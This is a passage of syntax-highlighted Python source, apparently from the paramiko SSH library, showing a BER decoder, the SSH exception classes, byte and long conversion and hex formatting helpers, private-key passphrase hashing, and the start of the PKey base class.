class="keyword">while</span> self.idx &lt; len(self.content):</span><br><span class="line">                t = ord(self.content[self.idx])</span><br><span class="line">                self.idx += <span class="number">1</span></span><br><span class="line">                ident = (ident &lt;&lt; <span class="number">7</span>) | (t &amp; <span class="number">0x7f</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (t &amp; <span class="number">0x80</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># now fetch length</span></span><br><span class="line">        size = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> size &amp; <span class="number">0x80</span>:</span><br><span class="line">            <span class="comment"># more complimicated...</span></span><br><span class="line">            <span class="comment"># <span class="doctag">FIXME:</span> theoretically should handle indefinite-length (0x80)</span></span><br><span class="line">            t = size &amp; <span class="number">0x7f</span></span><br><span class="line">            <span class="keyword">if</span> self.idx + t &gt; len(self.content):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            size = inflate_long(self.content[self.idx: self.idx + t], <span class="literal">True</span>)</span><br><span class="line">            self.idx += t</span><br><span class="line">        <span class="keyword">if</span> self.idx + size &gt; len(self.content):</span><br><span class="line">            <span class="comment"># can&#x27;t fit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        data = self.content[self.idx: self.idx + size]</span><br><span class="line">        self.idx += size</span><br><span class="line">        <span class="comment"># now switch on id</span></span><br><span class="line">        <span class="keyword">if</span> ident == <span class="number">0x30</span>:</span><br><span class="line">            <span class="comment"># sequence</span></span><br><span class="line">            <span class="keyword">return</span> self.decode_sequence(data)</span><br><span class="line">        <span class="keyword">elif</span> ident == <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># int</span></span><br><span class="line">            <span class="keyword">return</span> inflate_long(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 1: boolean (00 false, otherwise true)</span></span><br><span class="line">            <span class="keyword">raise</span> BERException(<span class="string">&#x27;Unknown ber encoding type %d (robey is lazy)&#x27;</span> % ident)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_sequence</span>(<span class="params">data</span>):</span></span><br><span class="line">        out = []</span><br><span class="line">        b = BER(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            x = b.decode_next()</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            out.append(x)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    decode_sequence = staticmethod(decode_sequence)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SSHException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised by failures in SSH2 protocol negotiation or logic errors.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when authentication failed for some reason.  It may be</span></span><br><span class="line"><span class="string">    possible to retry with different credentials.  (Other classes specify more</span></span><br><span class="line"><span class="string">    specific reasons.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordRequiredException</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when a password is needed to unlock a private key file.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadAuthenticationType</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an authentication type (like password) is used, but</span></span><br><span class="line"><span class="string">    the server isn&#x27;t allowing that type.  (It may only allow public-key, for</span></span><br><span class="line"><span class="string">    example.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar allowed_types: list of allowed authentication types provided by the</span></span><br><span class="line"><span class="string">        server (possible values are: C&#123;&quot;none&quot;&#125;, C&#123;&quot;password&quot;&#125;, and</span></span><br><span class="line"><span class="string">        C&#123;&quot;publickey&quot;&#125;).</span></span><br><span class="line"><span class="string">    @type allowed_types: list</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, explanation, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, explanation)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> SSHException.__str__(self) + <span class="string">&#x27; (allowed_types=%r)&#x27;</span> % self.allowed_types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PartialAuthentication</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    An internal exception thrown in the case of partial authentication.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, <span class="string">&#x27;partial authentication&#x27;</span>)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChannelException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an attempt to open a new L&#123;Channel&#125; fails.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar code: the error code returned by the server</span></span><br><span class="line"><span class="string">    @type code: int</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, code, text</span>):</span></span><br><span class="line">        SSHException.__init__(self, text)</span><br><span class="line">        self.code = code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadHostKeyException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    The host key given by the SSH server did not match what we were expecting.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar hostname: the hostname of the SSH server</span></span><br><span class="line"><span class="string">    @type hostname: str</span></span><br><span class="line"><span class="string">    @ivar key: the host key presented by the server</span></span><br><span class="line"><span class="string">    @type key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">    @ivar expected_key: the host key expected</span></span><br><span class="line"><span class="string">    @type expected_key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, hostname, got_key, expected_key</span>):</span></span><br><span class="line">        SSHException.__init__(self, <span class="string">&#x27;Host key for server %s does not match!&#x27;</span> % hostname)</span><br><span class="line">        self.hostname = hostname</span><br><span class="line">        self.key = got_key</span><br><span class="line">        self.expected_key = expected_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inflate_long</span>(<span class="params">s, always_positive=False</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;turns a normalized byte string into a long-int</span></span><br><span class="line"><span class="string">    (adapted from Crypto.Util.number)&quot;&quot;&quot;</span></span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    negative = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> always_positive <span class="keyword">and</span> (len(s) &gt; <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">        negative = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">4</span>:</span><br><span class="line">        filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> negative:</span><br><span class="line">            filler = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">        s = filler * (<span class="number">4</span> - len(s) % <span class="number">4</span>) + s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">        out = (out &lt;&lt; <span class="number">32</span>) + struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, s[i:i + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> negative:</span><br><span class="line">        out -= (<span class="number">1</span> &lt;&lt; (<span class="number">8</span> * len(s)))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deflate_long</span>(<span class="params">n, add_sign_padding=True</span>):</span></span><br><span class="line">    <span class="string">&quot;turns a long-int into a normalized byte string (adapted from Crypto.Util.number)&quot;</span></span><br><span class="line">    <span class="comment"># after much testing, this algorithm was deemed to be the fastest</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    n = long(n)</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) <span class="keyword">and</span> (n != <span class="number">-1</span>):</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, n &amp; <span class="number">0xffffffff</span>) + s</span><br><span class="line">        n = n &gt;&gt; <span class="number">32</span></span><br><span class="line">    <span class="comment"># strip off leading zeros, FFs</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(s):</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\000&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\xff&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># degenerate case, n was either 0 or -1</span></span><br><span class="line">        i = (<span class="number">0</span>,)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            s = <span class="string">&#x27;\000&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">    s = s[i[<span class="number">0</span>]:]</span><br><span class="line">    <span class="keyword">if</span> add_sign_padding:</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\x00&#x27;</span> + s</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &lt; <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span> + s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_weird</span>(<span class="params">data</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(data):</span><br><span class="line">        out += <span class="string">&#x27;%02X&#x27;</span> % ord(i[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">2</span>:</span><br><span class="line">            out += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">16</span> == <span class="number">15</span>:</span><br><span class="line">            out += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary</span>(<span class="params">data, prefix=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> len(data) &gt; x + <span class="number">16</span>:</span><br><span class="line">        out.append(format_binary_line(data[x:x + <span class="number">16</span>]))</span><br><span class="line">        x += <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; len(data):</span><br><span class="line">        out.append(format_binary_line(data[x:]))</span><br><span class="line">    <span class="keyword">return</span> [prefix + y <span class="keyword">for</span> y <span class="keyword">in</span> out]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_line</span>(<span class="params">data</span>):</span></span><br><span class="line">    left = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;%02X&#x27;</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    right = <span class="string">&#x27;&#x27;</span>.join([(<span class="string">&#x27;.%c..&#x27;</span> % c)[(ord(c) + <span class="number">63</span>) // <span class="number">95</span>] <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%-50s %s&#x27;</span> % (left, right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hexlify(s).upper()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unhexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unhexlify(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_string</span>(<span class="params">s</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> (ord(c) &gt;= <span class="number">32</span>) <span class="keyword">and</span> (ord(c) &lt;= <span class="number">127</span>):</span><br><span class="line">            out += c</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out += <span class="string">&#x27;%%%02X&#x27;</span> % ord(c)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_length</span>(<span class="params">n</span>):</span></span><br><span class="line">    norm = deflate_long(n, <span class="number">0</span>)</span><br><span class="line">    hbyte = ord(norm[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> hbyte == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    bitlen = len(norm) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (hbyte &amp; <span class="number">0x80</span>):</span><br><span class="line">        hbyte &lt;&lt;= <span class="number">1</span></span><br><span class="line">        bitlen -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> bitlen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tb_strings</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(traceback.format_exception(*sys.exc_info())).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key_bytes</span>(<span class="params">hashclass, salt, key, nbytes</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given a password, passphrase, or other human-source key, scramble it</span></span><br><span class="line"><span class="string">    through a secure hash into some keyworthy bytes.  This specific algorithm</span></span><br><span class="line"><span class="string">    is used for encrypting/decrypting private key files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @param hashclass: class from L&#123;Crypto.Hash&#125; that can be used as a secure</span></span><br><span class="line"><span class="string">        hashing function (like C&#123;MD5&#125; or C&#123;SHA&#125;).</span></span><br><span class="line"><span class="string">    @type hashclass: L&#123;Crypto.Hash&#125;</span></span><br><span class="line"><span class="string">    @param salt: data to salt the hash with.</span></span><br><span class="line"><span class="string">    @type salt: string</span></span><br><span class="line"><span class="string">    @param key: human-entered password or passphrase.</span></span><br><span class="line"><span class="string">    @type key: string</span></span><br><span class="line"><span class="string">    @param nbytes: number of bytes to generate.</span></span><br><span class="line"><span class="string">    @type nbytes: int</span></span><br><span class="line"><span class="string">    @return: key data</span></span><br><span class="line"><span class="string">    @rtype: string</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    keydata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    digest = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(salt) &gt; <span class="number">8</span>:</span><br><span class="line">        salt = salt[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">while</span> nbytes &gt; <span class="number">0</span>:</span><br><span class="line">        hash_obj = hashclass()</span><br><span class="line">        <span class="keyword">if</span> len(digest) &gt; <span class="number">0</span>:</span><br><span class="line">            hash_obj.update(digest)</span><br><span class="line">        hash_obj.update(key)</span><br><span class="line">        hash_obj.update(salt)</span><br><span class="line">        digest = hash_obj.digest()</span><br><span class="line">        size = min(nbytes, len(digest))</span><br><span class="line">        keydata += digest[:size]</span><br><span class="line">        nbytes -= size</span><br><span class="line">    <span class="keyword">return</span> keydata</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Common API for all public keys.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKey</span> (<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base class for public keys.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># known encryption types for private key files:</span></span><br><span class="line">    _CIPHER_TABLE = &#123;</span><br><span class="line">        <span class="string">&#x27;AES-128-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;DES-EDE3-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: DES3, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;mode&#x27;</span>: DES3.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;AES-256-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a new instance of this public key type.  If C&#123;msg&#125; is given,</span></span><br><span class="line"><span class="string">        the key&#x27;s public part(s) will be filled in from the message.  If</span></span><br><span class="line"><span class="string">        C&#123;data&#125; is given, the key&#x27;s public part(s) will be filled in from</span></span><br><span class="line"><span class="string">        the string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param msg: an optional SSH L&#123;Message&#125; containing a public key of this</span></span><br><span class="line"><span class="string">        type.</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @param data: an optional string containing a public key of this type</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise SSHException: if a key cannot be created from the C&#123;data&#125; or</span></span><br><span class="line"><span class="string">        C&#123;msg&#125; given, or no key was passed in.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a string of an SSH L&#123;Message&#125; made up of the public part(s) of</span></span><br><span class="line"><span class="string">        this key.  This string is suitable for passing to L&#123;__init__&#125; to</span></span><br><span class="line"><span class="string">        re-create the key object later.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: string representation of an SSH key message.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cmp__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Compare this key to another.  Returns 0 if this key is equivalent to</span></span><br><span class="line"><span class="string">        the given key, or non-0 if they are different.  Only the public parts</span></span><br><span class="line"><span class="string">        of the key are compared, so a public key will compare equal to its</span></span><br><span class="line"><span class="string">        corresponding private key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param other: key to compare to.</span></span><br><span class="line"><span class="string">        @type other: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">        @return: 0 if the two keys are equivalent, non-0 otherwise.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hs = hash(self)</span><br><span class="line">        ho = hash(other)</span><br><span class="line">        <span class="keyword">if</span> hs != ho:</span><br><span class="line">            <span class="keyword">return</span> cmp(hs, ho)</span><br><span class="line">        <span class="keyword">return</span> cmp(str(self), str(other))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the name of this private key implementation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: name of this private key type, in SSH terminology (for</span></span><br><span class="line"><span class="string">        example, C&#123;&quot;ssh-rsa&quot;&#125;).</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the number of significant bits in this key.  This is useful</span></span><br><span class="line"><span class="string">        for judging the relative security of a key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: bits in the key.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">can_sign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return C&#123;True&#125; if this key has the private part necessary for signing</span></span><br><span class="line"><span class="string">        data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if this is a private key.</span></span><br><span class="line"><span class="string">        @rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_fingerprint</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return an MD5 fingerprint of the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a 16-byte string (binary) of the MD5 fingerprint, in SSH</span></span><br><span class="line"><span class="string">            format.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> MD5.new(str(self)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a base64 string containing the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.  This format is compatible with that used to store</span></span><br><span class="line"><span class="string">        public key files or recognized host keys.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a base64 string containing the public part of the key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> base64.encodestring(str(self)).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_ssh_data</span>(<span class="params">self, rng, data</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Sign a blob of data with this private key, and return a L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        representing an SSH signature message.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param rng: a secure random number generator.</span></span><br><span class="line"><span class="string">        @type rng: L&#123;Crypto.Util.rng.RandomPool&#125;</span></span><br><span class="line"><span class="string">        @param data: the data to sign.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @return: an SSH signature message.</span></span><br><span class="line"><span class="string">        @rtype: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_ssh_sig</span>(<span class="params">self, data, msg</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Given a blob of data, and an SSH message representing a signature of</span></span><br><span class="line"><span class="string">        that data, verify that it was signed with this key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param data: the data that was signed.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @param msg: an SSH signature message</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if the signature verifies correctly; C&#123;False&#125;</span></span><br><span class="line"><span class="string">            otherwise.</span></span><br><span class="line"><span class="string">        @rtype: boolean</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key_file</span>(<span class="params">cls, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key file.  If the private</span></span><br><span class="line"><span class="string">        key is encrypted and C&#123;password&#125; is not C&#123;None&#125;, the given password</span></span><br><span class="line"><span class="string">        will be used to decrypt the key (otherwise L&#123;PasswordRequiredException&#125;</span></span><br><span 